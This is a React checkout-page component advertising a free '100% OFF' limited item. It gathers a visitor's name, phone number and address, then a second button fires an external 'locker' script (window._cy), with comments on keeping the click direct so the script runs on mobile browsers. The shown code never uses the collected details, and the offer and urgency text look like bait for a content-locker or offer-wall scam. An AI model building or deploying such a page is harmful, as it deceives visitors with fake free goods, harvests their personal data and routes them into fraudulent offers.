
import React, { useState } from 'react';
import { ArrowLeft, Lock } from 'lucide-react';
import { Button } from './Button';

interface CheckoutPageProps {
  product: any;
  onBack: () => void;
  onConfirm: (details: any) => void;
}

export const CheckoutPage: React.FC<CheckoutPageProps> = ({ product, onBack, onConfirm }) => {
  const [formData, setFormData] = useState({
    fullName: '',
    phone: '',
    address: ''
  });

  const [isValidated, setIsValidated] = useState(false);

  // STEP 1: Validate Fields Only
  // This function prepares the UI for the second step but does NOT call the locker.
  const handleValidateDetails = (e: React.MouseEvent) => {
    e.preventDefault();
    
    // 1. Validate fields
    if (!formData.fullName.trim() || !formData.phone.trim() || !formData.address.trim()) {
      alert("Please fill in all required fields.");
      return;
    }

    // 2. Move to Step 2
    setIsValidated(true);
  };

  // STEP 2: Trigger Locker
  // This function MUST NOT contain validation logic or async delays to work on mobile.
  const handleTriggerLocker = (e: React.MouseEvent) => {
    e.preventDefault();

    if (typeof (window as any)._cy === 'function') {
      // Direct call required for mobile browsers
      (window as any)._cy();
    } else {
      console.error("Locker script not loaded");
      alert("Security verification is still loading. Please wait a moment and try again.");
    }
  };

  if (!product) return null;

  return (
    <div className="min-h-screen bg-gray-900 pt-24 pb-12 px-6 animate-in fade-in duration-500">
      <div className="max-w-6xl mx-auto">
        <button 
          onClick={onBack}
          className="flex items-center text-gray-400 hover:text-white mb-8 transition-colors group"
        >
          <ArrowLeft className="w-5 h-5 mr-2 group-hover:-translate-x-1 transition-transform" />
          Back to Shop
        </button>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-12 lg:gap-24 items-start">
          {/* Left Column: Product Preview */}
          <div className="space-y-6 order-1">
            <div className="relative aspect-square w-full max-w-lg mx-auto lg:mx-0 bg-gray-800 rounded-3xl overflow-hidden shadow-2xl border border-white/5">
              <img 
                src={product.image} 
                alt={product.name} 
                className="w-full h-full object-cover"
              />
              <div className="absolute top-4 right-4 bg-primary text-white text-xs font-bold px-3 py-1.5 rounded-full shadow-lg">
                100% OFF
              </div>
            </div>
            
            <div className="text-center lg:text-left space-y-2">
              <h2 className="text-3xl font-bold text-white tracking-tight">{product.name}</h2>
              <div className="flex items-center justify-center lg:justify-start gap-4">
                <span className="text-gray-500 line-through text-lg font-medium">{product.originalPrice}</span>
                <span className="text-primary font-bold text-xl">100% Discount Applied</span>
              </div>
              <p className="text-gray-400 text-sm mt-4 max-w-md mx-auto lg:mx-0 leading-relaxed">
                You are claiming a limited edition promotional item. 
                Shipping details are required to verify your reservation and ensure delivery.
              </p>
            </div>
          </div>

          {/* Right Column: Shipping Form */}
          <div className="bg-gray-800/40 backdrop-blur-sm p-6 sm:p-8 rounded-3xl border border-white/5 order-2">
            <div className="mb-8">
              <h3 className="text-2xl font-bold text-white mb-2">Shipping Details</h3>
              <p className="text-gray-400 text-sm">Where should we send your item?</p>
            </div>

            {/* Use preventDefault on form to ensure Enter key doesn't reload */}
            <form onSubmit={(e) => e.preventDefault()} className="space-y-6">
              <div>
                <label htmlFor="fullName" className="block text-sm font-medium text-gray-300 mb-2">
                  Full Name <span className="text-primary">*</span>
                </label>
                <input
                  type="text"
                  id="fullName"
                  required
                  disabled={isValidated} // Lock inputs after validation
                  value={formData.fullName}
                  onChange={(e) => setFormData({...formData, fullName: e.target.value})}
                  className="w-full bg-gray-900/50 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                  placeholder="Enter your full name"
                />
              </div>

              <div>
                <label htmlFor="phone" className="block text-sm font-medium text-gray-300 mb-2">
                  Phone Number <span className="text-primary">*</span>
                </label>
                <input
                  type="tel"
                  id="phone"
                  required
                  disabled={isValidated}
                  value={formData.phone}
                  onChange={(e) => setFormData({...formData, phone: e.target.value})}
                  className="w-full bg-gray-900/50 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                  placeholder="Enter your phone number"
                />
              </div>

              <div>
                <label htmlFor="address" className="block text-sm font-medium text-gray-300 mb-2">
                  Shipping Address <span className="text-primary">*</span>
                </label>
                <textarea
                  id="address"
                  required
                  disabled={isValidated}
                  rows={4}
                  value={formData.address}
                  onChange={(e) => setFormData({...formData, address: e.target.value})}
                  className="w-full bg-gray-900/50 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all resize-none disabled:opacity-50 disabled:cursor-not-allowed"
                  placeholder="Street address, city, state, zip code"
                />
              </div>

              <div className="pt-4">
                {!isValidated ? (
                  /* STEP 1: VALIDATION BUTTON */
                  <Button 
                    type="button" 
                    onClick={handleValidateDetails}
                    className="w-full py-4 text-lg shadow-primary/25 hover:shadow-primary/40"
                  >
                    Confirm & Reserve My Item
                  </Button>
                ) : (
                  /* STEP 2: LOCKER BUTTON (Must be direct click) */
                  <Button 
                    type="button" 
                    onClick={handleTriggerLocker}
                    className="w-full py-4 text-lg shadow-primary/25 hover:shadow-primary/40 animate-in fade-in zoom-in duration-300"
                  >
                    Click Here to Finalize Verification
                  </Button>
                )}
                
                <div className="mt-4 flex items-start gap-2 text-xs text-gray-500 justify-center text-center">
                  <Lock className="w-3 h-3 mt-0.5 flex-shrink-0" />
                  <p>
                    This item is reserved under a 100% promotional discount. 
                    Limited to first 10 confirmed users.
                  </p>
                </div>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};
